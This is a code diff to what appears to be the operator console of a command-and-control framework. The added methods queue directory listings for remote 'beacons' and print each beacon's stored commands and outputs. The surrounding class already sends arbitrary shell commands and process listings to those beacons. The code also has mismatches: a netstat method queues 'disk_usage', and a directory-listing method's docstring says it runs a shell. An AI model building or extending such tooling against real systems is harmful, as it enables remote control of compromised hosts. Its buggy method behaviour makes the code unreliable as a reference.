@@ -2,7 +2,7 @@ from ServerDatabase.database import DatabaseClass
 from .global_objects import (
     add_beacon_command_list,
     remove_beacon_list,
-
+    beacon_commands
 )
 
 
@@ -52,6 +52,14 @@ class BeaconCommandsClass:
         command = input("Command: ")
         add_beacon_command_list(userID, f"shell {command}")
 
+    def list_dir(self, userID, IPAddress) -> None:
+        """runs a shell between the sessions client and server"""
+        print(
+            f"ListDir {IPAddress}: Type exit to quit session, "
+            "Please use absolute paths")
+        command = input("Directory: ")
+        add_beacon_command_list(userID, f"list_dir {command}")
+
     def list_processes(self, userID) -> None:
         add_beacon_command_list(userID, "list_processes")
         return
@@ -68,3 +76,10 @@ class BeaconCommandsClass:
     def netstat(self, userID) -> None:
         add_beacon_command_list(userID, "disk_usage")
         return
+
+    def list_db_commands(self, userID) -> None:
+        for j in range(len(beacon_commands["beacon_uuid"])):
+            if beacon_commands["beacon_uuid"][j] == userID:
+                print(f"""Command ID: {beacon_commands["command_uuid"][j]}
+                    Command: {beacon_commands["command"][j]}
+                    Response: {beacon_commands["command_output"][j]}""")
